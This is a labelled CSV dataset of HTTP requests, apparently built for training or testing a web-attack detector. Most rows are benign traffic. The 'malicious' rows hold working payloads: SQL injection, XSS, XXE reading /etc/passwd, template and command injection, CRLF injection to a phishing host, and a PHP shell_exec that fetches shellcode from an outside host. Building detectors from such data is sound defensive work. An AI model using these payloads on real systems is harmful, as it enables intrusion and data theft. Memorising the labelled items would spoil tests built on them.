label,text
benign,"POST /signup HTTP/1.1
Host: greenliving-magazine.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Referer: https://greenliving-magazine.net/signup
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Upgrade-Insecure-Requests: 1

email=rachel.bawn%40ecocity.org"
benign,"POST /support/ticket/create HTTP/1.1
Host: help-desk-services.co.uk
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept-Language: en-GB,en;q=0.5
Content-Length: 115
Connection: keep-alive

topic=Password+Reset%26Account+Access&description=Cannot+log+in+%23error+code+401%25+seen+after+resetting+password&priority=high"
benign,"POST /events/registration HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Accept-Encoding: gzip, deflate, br
Origin: https://online-retail-store.biz
Connection: keep-alive

event_id=summer_sale&attendance[]=in_person&attendance[]=virtual"
benign,"GET /img/svg/logo-negative.svg HTTP/1.1
Host: secure-user-portal.net
Accept: image/svg+xml,image/*
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: https://secure-user-portal.net/home
DNT: 1
Connection: keep-alive"
benign,"POST /api/v1/notifications/settings HTTP/1.1
Host: userprefs-global.io
Authorization: Bearer Zu8z2chy0837f9xz
Content-Type: application/json
Content-Length: 88
Idempotency-Key: 5cd1b8df-c3ac-4e83-b600-6f26a5fff5f7
X-Request-ID: d72a7c71-6f2e-4f7e-b5c8-557a3d0a3e2f
X-Client-Version: 1.14.3
Accept: application/json
Cache-Control: no-store
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36

{""userId"":56219,""notifications"":{""email"":true,""sms"":false,""push"":true}}"
benign,"GET /articles/archive?year=2023&month=11&author=marcus-lewis&category=technology&sort=date_desc&page=4&limit=15&highlight_tags=AI,blockchain&lang=en&exclude_rss=false&comments_enabled=true HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-us
Connection: keep-alive
Referer: https://my-personal-blog-site.info/articles/recent"
benign,"GET /reports/monthly-summary?format=pdf HTTP/1.1
Host: example.com:8080
Accept: application/pdf
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Pragma: no-cache
Accept-Language: en-GB,en;q=0.5"
benign,"GET /reviews/%C3%B6sterreich-caf%C3%A9s HTTP/1.1
Host: travelfoodie-europe.eu
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Accept-Language: de-AT,de;q=0.9,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Cookie: prefs=lang=de; session_cookie=xyZa23BFd9"
malicious,"POST /api/data/persist HTTP/1.1
Host: enterprise-analytics-platform.co
Content-Type: application/json
Content-Length: 295
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1
Origin: https://analytics.enterprise-analytics-platform.co
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.7

{""reportId"": ""rpt_9328475"", ""metrics"": {""clicks"": 1290, ""impressions"": 4520}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""flag_value"", ""timestamp"": ""2024-06-05T11:35:20Z""}"
malicious,"POST /feedback HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 115

user=guest&feedback=Excellent+work%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fpayloads-cloud.net%2Fshellcode.php+-O+%2Ftmp%2Fpayload.php%27%29%3B+%3F%3E"
benign,"DELETE /api/v1/users/98213 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.def456
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"GET /blog/post/view/99888?ref=%4a%5b%6C%7d HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-gb,en;q=0.8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Connection: close"
benign,"POST /account/security/notifications HTTP/1.1
Host: financial-dashboard-app.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 117
DNT: 1
Cookie: financeSess=842a9f23065cdd3c23a2af8d4bfe3ce1

{""notificationEmails"":[""security-alerts@financial-dashboard-app.co"",""it-support@financial-dashboard-app.co""],""enabled"":true}"
benign,"POST /user/profile/update HTTP/1.1
Host: mypetprofiles.petcare-zone.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 1204
User-Agent: curl/7.79.1
Accept: */*
Connection: close

userId=238947&petName=Whiskers&age=5&description=Whiskers+is+a+delightful+domestic+short-haired+cat+who+lives+for+playtime+and+cuddles.+She+enjoys+chasing+laser+pointers+and+has+a+special+fondness+for+catnip+toys.+Every+morning%2C+she+greets+us+with+a+soft+purr+and+a+gentle+rub+against+our+legs.+Whiskers+has+been+thriving+since+her+adoption+two+years+ago+and+is+in+excellent+health.+Our+family+values+her+companionship+immensely+and+takes+pride+in+providing+her+a+happy+and+stimulating+environment."
malicious,"POST /account/settings HTTP/1.1
Host: secure-site-management.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain
Content-Length: 95
Referer: https://secure-site-management.org/home
Cookie: login_sess=1a4c3f2d50784cda897e50b0ae9d2d7b

user%5Bemail%5D=adminuser%40secure-site-management.org&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=14&user%5Broles%5D%5B%5D=17"
malicious,"PUT /api/v1/account/settings HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 104
Accept: application/json
User-Agent: Python-urllib/3.9
X-CSRF-Token: b92d9f210a964eb48df8d2367b9f44ae

{""displayName"": ""Lara_Croft"", ""statusMessage"": ""Happy to be here' Or 'x'='x""}"
benign,"GET /events/schedule/week42 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml
DNT: 1
Referer: https://community.game-dev-forum.org/
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /blog/article/view?id=42 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Referer: http://referrer.my-personal-blog-site.info/{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }} #}
Upgrade-Insecure-Requests: 1"
benign,"POST /members/signin HTTP/1.1
Host: global-photo-share.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://global-photo-share.net
Referer: https://global-photo-share.net/members/signin
Cookie: auth_token=gh23456789; csrf_token=78bcedf2300a
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

username=sarah_foster&password=PicLover2024"
benign,"GET /forum/thread/34567 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: session_id=8f7b68a9c3d2a02e2d5fbb47a9a4f4c8; theme=dark
Connection: keep-alive
Cache-Control: max-age=0"
benign,"GET /status HTTP/1.1
Host: analytics-pipeline.cloud
User-Agent: Nagios-Plugin/1.4
Accept: application/json
Connection: close"
benign,"POST /settings/notifications/update HTTP/1.1
Host: nextgen-healthcare-solutions.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 210
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://nextgen-healthcare-solutions.io/dashboard
Connection: keep-alive

user_id=21309&email_alerts=enabled&sms_alerts=disabled&preferences=%3Cpreferences%3EReceive+weekly+updates+only.%3C%2Fpreferences%3E"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: inventory-vault.org
User-Agent: curl/7.85.0
Accept: */*
Origin: https://inventory-vault.org
Access-Control-Request-Method: PUT
Connection: close"
malicious,"GET /admin/run_backup_script.sh?tool_option=backup1%3B%20cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: client-data-ops.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /news/world/latest?lang=en&callback=processData HTTP/1.1
Host: global-info-daily.org
Accept: application/javascript, */*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Referer: https://global-info-daily.org/home
Pragma: no-cache
Connection: close"
benign,"GET /events/2024/sustainability-conference HTTP/1.1
Host: eco-initiative.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Language: en-GB,en;q=0.5
DNT: 1
Connection: keep-alive"
benign,"GET /v1/user/notifications/unread-count HTTP/1.1
Host: notifications-service.my-personal-blog-site.info
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer ea3b2c4e637b482d9d8c56f6884e5caf
Origin: https://my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Language: en-US,en;q=0.5
Pragma: no-cache"
benign,"GET /scripts/app.bundle.js HTTP/1.1
Host: next-gen-ecommerce.biz
User-Agent: Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1k
Accept: application/javascript, text/javascript, */*;q=0.1
Accept-Language: en-GB,en;q=0.7
Connection: close"
benign,"GET /mobile/shop/offers HTTP/1.1
Host: online-retail-store.biz
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
benign,"HEAD /blog/how-to-breathe-right HTTP/1.1
Host: mindful-living-journal.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
DNT: 1"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fonline-retail-store.biz%2Fproduct%2Felectronics%2Ftv HTTP/1.1
Host: api.online-retail-store.biz
Accept: application/json
User-Agent: curl/7.88.1
Accept-Language: en
Connection: close"
benign,"GET /api/v1/customers/982347 HTTP/1.1
Host: secure-data-hub.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiNDAxMiJ9.uW4plaKECYx2R4z-dTRDXKkzo8YKZixstsSxBRAhYU4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: fast-response-portal.online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Type: text/plain
Content-Length: 26
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive

Tracking info updated: delayed."
benign,"GET /user/elonra88 HTTP/1.1
Host: globalgeeksocial.org
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://globalgeeksocial.org/friends
Cookie: loginToken=094bc1827f1d3a08ec4e90a5b33279f8; lastVisit=1684819200
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
malicious,"GET /api/v2/data/export HTTP/1.1
Host: fast-data-pipelines.io
User-Agent: ExportTool/9.0 `uname -a`
Accept: application/json
Accept-Encoding: gzip, deflate
Origin: https://dashboard.fast-data-pipelines.io
Cache-Control: max-age=0"
benign,"GET /app/profile/view?user_id=74215 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15F79 Safari/604.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://secure-user-portal.net/app/dashboard
Cookie: session_id=hn3uqwj2ox19c7szp5e7dv9a8f"
malicious,"GET /admin/logs/fetch/backup-server-7b%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: securevault-enterprise.org
User-Agent: Wget/1.21.3 (linux-gnu)
Accept: */*
Connection: close"
malicious,"GET /api/v3/items/search?query=laptop&query=gaming&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Origin: https://api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/docs
Connection: keep-alive"
malicious,"POST /api/v3/xml/process HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/xml
Accept-Language: en-US,en;q=0.5
Content-Length: 195

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE product [
<!ELEMENT product ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<product>
  <productId>&xxe;</productId>
  <description>Some product</description>
</product>"
benign,"HEAD /api/v1/users/status HTTP/1.1
Host: api.secure-connectivity.io
User-Agent: NodeFetch/1.0 (+https://github.com/node-fetch/node-fetch)
Accept: */*
Connection: keep-alive"
benign,"GET /news/world/peace-talks-successful-outcomes HTTP/1.1
Host: global-insights.news
Connection: close
Accept: text/html,application/xhtml+xml
Referer: https://global-insights.news/news/world
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
benign,"HEAD /api/v1/status HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
malicious,"PUT /api/v5/redirect HTTP/1.1
Host: tech-support-helpdesk.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/plain
Accept-Language: en-US,en;q=0.6
Content-Type: application/json
Content-Length: 280
Referer: https://tech-support-helpdesk.ai/dashboard
Cookie: auth_token=token12345abcdef67890

{""redirect_url"": ""/helpdesk/home%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://phishing.tech-support-helpdesk.ai%0d%0a%0d%0a<html><body>Redirecting...</body></html>""}"
benign,"GET /api/v2/user/profile?id=1829 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.87.0
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: close"
benign,"OPTIONS /v3/orders/new HTTP/1.1
Host: orders.central-shopdomain.biz
Origin: https://dashboard.retailpartner-platform.net
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.121 Mobile Safari/537.36
Accept: */*
Connection: close"
benign,"PUT /api/v1/employees/2209/profile HTTP/1.1
Host: hr-central-portal.org
Authorization: Bearer zYxWvUtSrQpOnMlKjIhGfEdCbA0987654321
Content-Type: application/xml
Accept: application/xml
Referer: https://hr-central-portal.org/dashboard
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Content-Length: 130

<?xml version=""1.0"" encoding=""UTF-8""?>
<employee>
  <department>Finance</department>
  <phone>+1-202-555-0167</phone>
  <address>742 Evergreen Terrace</address>
</employee>"
malicious,"GET /api/v3/items/search?q=test&%71%3D%27%20OR%20%271%27%3D%271 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Pragma: no-cache
Connection: keep-alive"
benign,"PATCH /api/accounts/66721/preferences HTTP/1.1
Host: media-streaming-service.io
Authorization: Bearer bN92t8vPFwAQyReo3jDn1lzKmVxLvCqS
Content-Type: application/json-patch+json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/json
Content-Length: 105

[{""op"": ""replace"", ""path"": ""/playback/quality"", ""value"": ""1080p""}, {""op"": ""add"", ""path"": ""/playlists/-"", ""value"": ""Chill Vibes""}]"
malicious,"GET /api/v3/items/7' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/info HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://cloud-data-services.ai/app/items
User-Agent: curl/7.77.0"
malicious,"GET /app/user/profile HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_filter=(uid=admin%00; lang=en-US; theme=dark"
